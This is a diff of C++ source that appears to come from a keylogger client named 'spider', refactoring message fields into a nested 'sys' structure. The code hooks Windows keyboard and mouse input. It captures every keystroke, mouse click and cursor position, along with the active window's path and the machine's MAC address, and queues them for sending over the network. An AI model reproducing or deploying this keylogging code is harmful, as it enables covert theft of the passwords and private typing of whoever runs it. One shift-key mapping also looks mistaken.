@@ -303,111 +303,111 @@ namespace spider
       {
 	static bool shift = false;
 
-	msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);
-	msg.event.upper = 0;
+	msg.sys.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);
+	msg.sys.event.upper = 0;
 	if ((virtualKey == VK_SHIFT) || (virtualKey == VK_LSHIFT) ||
 	    (virtualKey == VK_RSHIFT))
 	  {
-	    shift =
-	        (msg.event.state == SystemMsgEventState::Up) ? false : true;
+	    shift = (msg.sys.event.state == SystemMsgEventState::Up) ? false
+	                                                             : true;
 	    return;
 	  }
 	if (m_windowsKeyboardMap.find(virtualKey) !=
 	    m_windowsKeyboardMap.end())
 	  {
-	    msg.event.key =
+	    msg.sys.event.key =
 	        static_cast<std::uint32_t>(m_windowsKeyboardMap[virtualKey]);
 	    if (shift)
 	      {
-		switch (msg.event.key)
+		switch (msg.sys.event.key)
 		  {
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_1):
-		    msg.event.key = static_cast<std::uint32_t>(
+		    msg.sys.event.key = static_cast<std::uint32_t>(
 		        KeyboardKey::KB_EXCLAMATION);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_2):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_ATSYMBOL);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_3):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_HASHTAG);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_4):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_DOLLAR);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_5):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_PERCENT);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_6):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_CIRCUMFLEX);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_7):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_AMPERSAND);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_8):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_ASTERISK);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_9):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_LEFTPAREN);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_0):
-		    msg.event.key = static_cast<std::uint32_t>(
+		    msg.sys.event.key = static_cast<std::uint32_t>(
 		        KeyboardKey::KB_EXCLAMATION);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_SEMICOLON):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_COLON);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_EQUALS):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_PLUS);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_COMMA):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_INFERIOR);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_MINUS):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_UNDERSCORE);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_DOT):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_SUPERIOR);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_SLASH):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_QUESTION);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_BACKQUOTE):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_TILDE);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACKET):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACE);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_BACKSLASH):
-		    msg.event.key = static_cast<std::uint32_t>(
+		    msg.sys.event.key = static_cast<std::uint32_t>(
 		        KeyboardKey::KB_VERTICALBAR);
 		    break;
 		  case static_cast<std::uint32_t>(
 		      KeyboardKey::KB_RIGHTBRACKET):
-		    msg.event.key =
+		    msg.sys.event.key =
 		        static_cast<std::uint32_t>(KeyboardKey::KB_RIGHTBRACE);
 		    break;
 		  case static_cast<std::uint32_t>(KeyboardKey::KB_SIMPLEQUOTE):
-		    msg.event.key = static_cast<std::uint32_t>(
+		    msg.sys.event.key = static_cast<std::uint32_t>(
 		        KeyboardKey::KB_DOUBLEQUOTE);
 		    break;
 		  default:
-		    msg.event.upper = 1;
+		    msg.sys.event.upper = 1;
 		    break;
 		  }
 	      }
@@ -423,21 +423,22 @@ namespace spider
 	    spider::client::SystemMsg msg;
 	    bool                      send = false;
 
-	    msg.type = SystemMsgType::EventKeyboard;
-	    msg.time = std::chrono::duration_cast<std::chrono::microseconds>(
-	                   std::chrono::system_clock::now().time_since_epoch())
-	                   .count();
-	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.mac.data());
+	    msg.sys.type = SystemMsgType::EventKeyboard;
+	    msg.sys.time =
+	        std::chrono::duration_cast<std::chrono::microseconds>(
+	            std::chrono::system_clock::now().time_since_epoch())
+	            .count();
+	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
 	    switch (wParam)
 	      {
 	      case WM_KEYDOWN:
-		msg.event.state = SystemMsgEventState::Down;
+		msg.sys.event.state = SystemMsgEventState::Down;
 		send = true;
 		break;
 	      case WM_SYSKEYDOWN:
 		break;
 	      case WM_KEYUP:
-		msg.event.state = SystemMsgEventState::Up;
+		msg.sys.event.state = SystemMsgEventState::Up;
 		send = true;
 		break;
 	      case WM_SYSKEYUP:
@@ -461,8 +462,9 @@ namespace spider
 		std::string cur(currentWindow.data());
 
 		extractPath(cur);
-		msg.currentWindow.fill(0);
-		std::copy(cur.begin(), cur.end(), msg.currentWindow.data());
+		msg.sys.currentWindow.fill(0);
+		std::copy(cur.begin(), cur.end(),
+		          msg.sys.currentWindow.data());
 		m_sendToNetwork->push(msg);
 	      }
 	  }
@@ -477,37 +479,38 @@ namespace spider
 	    bool                      getPos = false;
 	    spider::client::SystemMsg msg;
 
-	    msg.type = spider::client::SystemMsgType::EventMouse;
-	    msg.time = std::chrono::duration_cast<std::chrono::microseconds>(
-	                   std::chrono::system_clock::now().time_since_epoch())
-	                   .count();
-	    msg.event.upper = 0;
-	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.mac.data());
+	    msg.sys.type = spider::client::SystemMsgType::EventMouse;
+	    msg.sys.time =
+	        std::chrono::duration_cast<std::chrono::microseconds>(
+	            std::chrono::system_clock::now().time_since_epoch())
+	            .count();
+	    msg.sys.event.upper = 0;
+	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
 	    switch (wParam)
 	      {
 	      case WM_LBUTTONDOWN:
 		getPos = true;
-		msg.event.key =
+		msg.sys.event.key =
 		    static_cast<std::uint32_t>(MouseButton::ButtonLeft);
-		msg.event.state = SystemMsgEventState::Down;
+		msg.sys.event.state = SystemMsgEventState::Down;
 		break;
 	      case WM_LBUTTONUP:
 		getPos = true;
-		msg.event.key =
+		msg.sys.event.key =
 		    static_cast<std::uint32_t>(MouseButton::ButtonLeft);
-		msg.event.state = SystemMsgEventState::Up;
+		msg.sys.event.state = SystemMsgEventState::Up;
 		break;
 	      case WM_RBUTTONDOWN:
 		getPos = true;
-		msg.event.key =
+		msg.sys.event.key =
 		    static_cast<std::uint32_t>(MouseButton::ButtonRight);
-		msg.event.state = SystemMsgEventState::Down;
+		msg.sys.event.state = SystemMsgEventState::Down;
 		break;
 	      case WM_RBUTTONUP:
 		getPos = true;
-		msg.event.key =
+		msg.sys.event.key =
 		    static_cast<std::uint32_t>(MouseButton::ButtonRight);
-		msg.event.state = SystemMsgEventState::Up;
+		msg.sys.event.state = SystemMsgEventState::Up;
 		break;
 	      default:
 		break;
@@ -520,11 +523,12 @@ namespace spider
 		std::string cur(currentWindow.data());
 
 		extractPath(cur);
-		msg.currentWindow.fill(0);
-		std::copy(cur.begin(), cur.end(), msg.currentWindow.data());
-		msg.event.posX =
+		msg.sys.currentWindow.fill(0);
+		std::copy(cur.begin(), cur.end(),
+		          msg.sys.currentWindow.data());
+		msg.sys.event.posX =
 		    reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x;
-		msg.event.posY =
+		msg.sys.event.posY =
 		    reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y;
 
 		SpiderPlugin::m_sendToNetwork->push(msg);
